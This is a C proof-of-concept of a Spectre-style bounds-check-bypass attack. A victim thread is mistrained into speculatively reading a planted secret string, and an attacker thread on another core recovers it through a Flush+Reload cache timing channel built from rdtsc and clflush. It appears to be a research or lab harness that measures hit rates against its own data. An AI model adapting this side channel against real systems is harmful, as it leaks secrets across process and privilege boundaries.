#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mman.h>
#include <pthread.h>

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "IIIIIIIIIIIIIIIIIII"
#define DATA_SECRET DATA SECRET
unsigned char data[128];

// Some shared data between attacker thread and set up thread
static size_t CACHE_MISS = 180;
static size_t pagesize = 0;
char *mem;

pthread_barrier_t encode_done, arg_pass;
struct args {
	int index;
};

/* ---- Utility Funcs ---- */

static inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
    uint64_t a, d;
    asm volatile ("mfence\n\t"
        "CPUID\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

// ---------------------------------------------------------------------------
static inline __attribute__((always_inline)) uint64_t rdtsc_end() {
    uint64_t a, d;
    asm volatile("mfence\n\t"
        "RDTSCP\n\t"
        "mov %%rdx, %0\n\t"
        "mov %%rax, %1\n\t"
        "CPUID\n\t"
        "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
    a = (d<<32) | a;
    return a;
}

static inline __attribute__((always_inline)) void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

static inline __attribute__((always_inline)) void mfence() {
    asm volatile("mfence");
}

static inline __attribute__((always_inline)) void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

void flush_shared_memory() {
  for(int j = 0; j < 256; j++) {
    flush(mem + j * pagesize);
  }
}

void flush_reload(void *ptr, int index) {
	uint64_t start = 0, end = 0;

	start = rdtsc_begin();
	maccess(ptr);
	end = rdtsc_end();

	mfence();

	flush(ptr);

  if (end - start < CACHE_MISS) {
    printf("%d\n", index);
  }
}

void cache_decode_pretty(char *leaked, int index) {

  flush_reload(mem + 73 * pagesize, 73);
  // for(int i = 0; i < 256; i++) {
  //   int mix_i = ((i * 167) + 73) & 255; // avoid prefetcher
  //   flush_reload(mem + mix_i * pagesize, mix_i);
  // }
}

void access_array(int x) {
	// flushing the data which is used in the condition increases
	// probability of speculation
	size_t len = sizeof(DATA) - 1;
	flush(&len);
	flush(&x);
 	mfence();

	// check that only accessible part (DATA) can be accessed
	if((float)x / (float)len < 1) {
		maccess(mem + data[x] * pagesize);
	}
}

/* ---- Victim Thread ---- */
void *victim(void *args) {
	// Thread Setup //
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(0, &cpuset);
	pthread_t thread;
	thread = pthread_self();
	int ret = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	if (ret != 0) {
		fprintf(stderr, "pthread_setaffinity_np() failed\n");
		exit(EXIT_FAILURE);
	}
	
	// Victim Leaking Data //
	while(1) {
		pthread_barrier_wait(&arg_pass);
		int j = ((struct args *)args)->index;

		// mistrain with valid index
		for(int y = 0; y < 10; y++) {
			access_array(0);
		}
  		flush(mem + data[0] * pagesize);
		
		access_array(j);
		pthread_barrier_wait(&encode_done);
	}
}

/* ---- Attacker Thread ---- */
void *attacker(void *args) {
	// Thread Setup //
	cpu_set_t cpuset;
	CPU_ZERO(&cpuset);
	CPU_SET(8, &cpuset);
	pthread_t thread;
	thread = pthread_self();
	int ret = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &cpuset);
	if (ret != 0) {
		fprintf(stderr, "pthread_setaffinity_np() failed\n");
		exit(EXIT_FAILURE);
	}

	// nothing leaked so far
	char leaked[sizeof(DATA_SECRET) + 1];
	memset(leaked, ' ', sizeof(leaked));
	leaked[sizeof(DATA_SECRET)] = 0;

	int ITS = 1000;
	printf("%d\n", ITS);

	for (int i = 0; i < ITS; i++)  {
		int j = (rand() % 21) + 5;
		((struct args *)args)->index = j;

		pthread_barrier_wait(&arg_pass);
		pthread_barrier_wait(&encode_done);

		cache_decode_pretty(leaked, j);

		sched_yield();
 	}
}

int main(int argc, char **argv) {
	pagesize = sysconf(_SC_PAGESIZE);
	// Detect cache threshold
	// if(!CACHE_MISS) 
	// CACHE_MISS = detect_flush_reload_threshold();
	// printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

	char *_mem = malloc(pagesize * (256 + 4));
	// page aligned
	mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
	// initialize memory
	memset(mem, 0, pagesize * 256);

	// store secret
	memset(data, ' ', sizeof(data));
	memcpy(data, DATA_SECRET, sizeof(DATA_SECRET));
	// ensure data terminates
	data[sizeof(data) / sizeof(data[0]) - 1] = '0';

	// flush our shared memory
	flush_shared_memory();

	// Starting Threads
	pthread_t vic_thread, att_thread;
	struct args *arg = (struct args *)malloc(sizeof(struct args));

	pthread_barrier_init(&encode_done, NULL, 2);
	pthread_barrier_init(&arg_pass, NULL, 2);
	
    /* ---- Attack Window ---- */	
	// Leaking Data //
	pthread_create(&att_thread, NULL, attacker, (void *)arg);
	pthread_create(&vic_thread, NULL, victim, (void *)arg);

	pthread_join(att_thread, NULL);
	// Thread Cleanup //
	pthread_cancel(vic_thread);
	pthread_cancel(att_thread);
	return EXIT_SUCCESS;
}